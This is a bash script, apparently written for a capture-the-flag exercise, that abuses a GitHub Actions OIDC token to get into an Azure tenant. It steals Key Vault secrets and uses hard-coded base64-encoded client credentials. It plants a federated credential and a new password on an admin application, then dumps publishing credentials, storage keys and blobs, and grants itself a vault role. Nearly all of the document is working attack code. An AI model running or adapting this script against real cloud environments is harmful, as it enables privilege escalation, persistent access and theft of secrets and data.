#!/usr/bin/env bash
set +e

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"

echo "=== 1. OIDC TOKEN ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
echo "OIDC len=${#OIDC}"
OIDC_SUB=$(echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('sub',''))")
echo "OIDC_SUB=$OIDC_SUB"

echo ""
echo "=== 2. CICD-DEPLOYER TOKENS ==="
cicd_token() {
  curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" -d "scope=$1" \
    -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=$OIDC" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"
}
CICD_VAULT=$(cicd_token "https://vault.azure.net/.default")
CICD_ARM=$(cicd_token "https://management.azure.com/.default")
echo "CICD vault=${#CICD_VAULT} arm=${#CICD_ARM}"

echo ""
echo "=== 3. KV1 SECRETS ==="
for S in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  V=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$S?api-version=7.4" -H "Authorization: Bearer $CICD_VAULT" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
  echo "$S=$(echo -n "$V" | base64 -w0)"
done

echo ""
echo "=== 4. SYNC-SERVICE TOKENS ==="
SY_CID=$(printf '%s' 'NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0' | base64 -d)
SY_SEC=$(printf '%s' 'c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==' | base64 -d)
sy_token() {
  curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=$SY_CID" --data-urlencode "client_secret=$SY_SEC" -d "scope=$1" -d "grant_type=client_credentials" \
    | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"
}
SY_GR=$(sy_token "https://graph.microsoft.com/.default")
SY_ARM=$(sy_token "https://management.azure.com/.default")
echo "SY graph=${#SY_GR} arm=${#SY_ARM}"

echo ""
echo "=== 5. ADD FIC TO LEGACY-ADMIN ==="
LEGACY_APP_OBJ="22a3fb7e-860a-4708-9e50-3d36aa21191c"
FIC_NAME="minh-pipe-$(date +%s)"
FIC_RES=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/$LEGACY_APP_OBJ/federatedIdentityCredentials" \
  -H "Authorization: Bearer $SY_GR" -H "Content-Type: application/json" \
  -d "{\"name\":\"$FIC_NAME\",\"issuer\":\"https://token.actions.githubusercontent.com\",\"subject\":\"$OIDC_SUB\",\"audiences\":[\"api://AzureADTokenExchange\"],\"description\":\"auto\"}")
echo "FIC_RES=$(echo "$FIC_RES" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('id',d.get('error',{}).get('code','')))")"

echo "Waiting 15s for FIC propagation..."
sleep 15

echo ""
echo "=== 6. AUTHENTICATE AS LEGACY-ADMIN VIA OIDC ==="
OIDC2=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
la_oidc() {
  curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d "scope=$1" \
    -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=$OIDC2" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('access_token','ERR:'+d.get('error_description','')[:200]))"
}
LA_VAULT=$(la_oidc "https://vault.azure.net/.default")
LA_ARM=$(la_oidc "https://management.azure.com/.default")
LA_STOR=$(la_oidc "https://storage.azure.com/.default")
LA_GRAPH=$(la_oidc "https://graph.microsoft.com/.default")
echo "LA vault=${#LA_VAULT} arm=${#LA_ARM} stor=${#LA_STOR} graph=${#LA_GRAPH}"

# Decode tokens
for TNAME in LA_VAULT LA_ARM LA_STOR LA_GRAPH; do
  TVAL="${!TNAME}"
  if [[ "$TVAL" != ERR:* ]] && [ ${#TVAL} -gt 500 ]; then
    echo "${TNAME} roles: $(echo "$TVAL" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print('roles='+str(d.get('roles',[])), 'wids='+str(d.get('wids',[])))")"
  fi
done

echo ""
echo "=== 7. PROBE WITH LEGACY-ADMIN ==="

# 7a. KV2 with vault token
if [[ "$LA_VAULT" != ERR:* ]] && [ ${#LA_VAULT} -gt 500 ]; then
  echo "--- KV2 secrets ---"
  KV2=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $LA_VAULT")
  echo "$KV2" | python3 -c "import sys,json;d=json.load(sys.stdin);[print(s.get('id','')) for s in d.get('value',[])] or print(d.get('error',{}).get('code',''),d.get('error',{}).get('message','')[:300])"
  
  # Try specific secret names
  for SNAME in flag platform-flag df26-flag challenge-flag tbl-flag ctf-flag the-flag secret-flag; do
    R=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$SNAME?api-version=7.4" -H "Authorization: Bearer $LA_VAULT")
    V=$(echo "$R" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('value','E:'+d.get('error',{}).get('code','')))")
    [ "$V" != "E:SecretNotFound" ] && [ "$V" != "E:Forbidden" ] && echo "KV2/$SNAME=$V"
  done
  
  echo "--- KV1 secrets ---"
  KV1=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $LA_VAULT")
  echo "$KV1" | python3 -c "import sys,json;d=json.load(sys.stdin);[print(s.get('id','')) for s in d.get('value',[])] or print(d.get('error',{}).get('code',''),d.get('error',{}).get('message','')[:300])"
fi

# 7b. ARM operations
if [[ "$LA_ARM" != ERR:* ]] && [ ${#LA_ARM} -gt 500 ]; then
  echo "--- Storefront app settings ---"
  curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01" \
    -H "Authorization: Bearer $LA_ARM" -H "Content-Length: 0" | python3 -c "import sys,json;d=json.load(sys.stdin);print(json.dumps(d.get('properties',d.get('error',d)),indent=2)[:2000])"
  
  echo "--- Storefront publishing creds ---"
  curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/publishingcredentials/list?api-version=2023-01-01" \
    -H "Authorization: Bearer $LA_ARM" -H "Content-Length: 0" | python3 -c "import sys,json;d=json.load(sys.stdin);p=d.get('properties',{});print(f'user={p.get(\"publishingUserName\",\"\")} pass={p.get(\"publishingPassword\",\"\")}') if p.get('publishingUserName') else print(json.dumps(d.get('error',d))[:500])"
  
  echo "--- Storage listKeys ---"
  for SA in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
    K=$(curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
      -H "Authorization: Bearer $LA_ARM" -H "Content-Length: 0" | python3 -c "import sys,json;d=json.load(sys.stdin);k=d.get('keys',[{}])[0].get('value','');print('KEY='+k if k else 'FAIL='+d.get('error',{}).get('code',''))")
    echo "  $SA: $K"
  done
  
  echo "--- Create role assignment for KV2 data plane ---"
  curl -sS -X PUT "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments/$(python3 -c 'import uuid;print(uuid.uuid4())')?api-version=2022-04-01" \
    -H "Authorization: Bearer $LA_ARM" -H "Content-Type: application/json" \
    -d "{\"properties\":{\"roleDefinitionId\":\"/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6\",\"principalId\":\"43834909-47cf-4a4a-8048-e323b4897ed3\"}}" \
    | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('properties',{}).get('roleDefinitionId','') or d.get('error',{}).get('code','')+'='+d.get('error',{}).get('message','')[:200])"
fi

# 7c. Storage data plane
if [[ "$LA_STOR" != ERR:* ]] && [ ${#LA_STOR} -gt 500 ]; then
  echo "--- Storage blobs ---"
  for SA in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
    CLIST=$(curl -sS "https://$SA.blob.core.windows.net/?comp=list" -H "Authorization: Bearer $LA_STOR" -H "x-ms-version: 2021-08-06")
    echo "  $SA containers: $(echo "$CLIST" | grep -oP '<Name>[^<]+</Name>' | tr '\n' ' ')"
    for C in $(echo "$CLIST" | grep -oP '<Name>\K[^<]+'); do
      BLIST=$(curl -sS "https://$SA.blob.core.windows.net/$C?restype=container&comp=list" -H "Authorization: Bearer $LA_STOR" -H "x-ms-version: 2021-08-06")
      for B in $(echo "$BLIST" | grep -oP '<Name>\K[^<]+' | head -30); do
        BDATA=$(curl -sS "https://$SA.blob.core.windows.net/$C/$B" -H "Authorization: Bearer $LA_STOR" -H "x-ms-version: 2021-08-06")
        echo "  $SA/$C/$B: $(echo "$BDATA" | head -c 500)"
        echo "$BDATA" | grep -aoE 'DF26\{[^}]+\}' && echo "*** FLAG ***"
      done
    done
  done
fi

echo ""
echo "=== 8. ALSO TRY ADDPASSWORD + CLIENT_CREDENTIALS ==="
LA_SEC=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/$LEGACY_APP_OBJ/addPassword" \
  -H "Authorization: Bearer $SY_GR" -H "Content-Type: application/json" \
  -d '{"passwordCredential":{"displayName":"auto-probe"}}' | python3 -c "import sys,json;print(json.load(sys.stdin).get('secretText',''))")
echo "LA secret len=${#LA_SEC}"
if [ -n "$LA_SEC" ]; then
  sleep 10
  for SCOPE in "https://vault.azure.net/.default" "https://management.azure.com/.default" "https://storage.azure.com/.default"; do
    T=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
      -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" --data-urlencode "client_secret=$LA_SEC" \
      -d "scope=$SCOPE" -d "grant_type=client_credentials" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('access_token','ERR:'+d.get('error_description','')[:100]))")
    echo "LA_CC ${SCOPE##*/}: len=${#T}"
    if [[ "$T" != ERR:* ]] && [ ${#T} -gt 500 ]; then
      echo "  $(echo "$T" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print('roles='+str(d.get('roles',[])),'wids='+str(d.get('wids',[])))")"
    fi
  done
fi

echo ""
echo "=== 9. DUMP ALL ENV ==="
env | sort | grep -viE 'token|secret|password|key' | head -30

echo ""
echo "=== DONE ==="
